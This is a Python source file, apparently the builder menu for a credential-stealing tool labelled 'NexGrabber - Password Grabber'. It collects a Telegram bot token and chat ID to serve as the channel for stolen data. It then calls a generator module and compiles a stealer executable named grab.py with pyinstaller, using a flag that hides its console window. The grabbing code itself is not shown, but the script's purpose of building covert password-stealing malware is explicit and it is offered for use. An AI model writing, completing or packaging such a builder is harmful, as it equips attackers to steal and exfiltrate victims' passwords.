import os
import time
import platform
from src import generate
from src import test_id
from colorama import init, Fore

init(autoreset=True)

menu = """
\033[1;36mNexGrabber - Password Grabber\033[0m

Select an option:

\033[1;33m1. Build\033[0m
\033[1;33m2. Exit\033[0m
"""

def clear_screen():
    system_platform = platform.system()
    os.system('cls' if system_platform == 'Windows' else 'clear')

def configure_tokens():
    chat_token = input("> Enter your Telegram bot token: ")
    chat_id = input("> Enter your chat ID: ")
    return chat_token, chat_id

running = True
while running:
    time.sleep(1)
    clear_screen()
    print(menu)
    option = input("> ")

    if option == "1":
        chat_token, chat_id = configure_tokens()
        test_result = test_id.test(chat_token, chat_id)
        
        if test_result:
            print(Fore.GREEN + "[+] Success! Generating...")
            generate.generate(chat_token, chat_id)
            os.system("pyinstaller --hide-console=hide-early grab.py")
        else:
            print(Fore.RED + "[!] Please enter a valid bot token or ID")
    elif option == "2":
        running = False
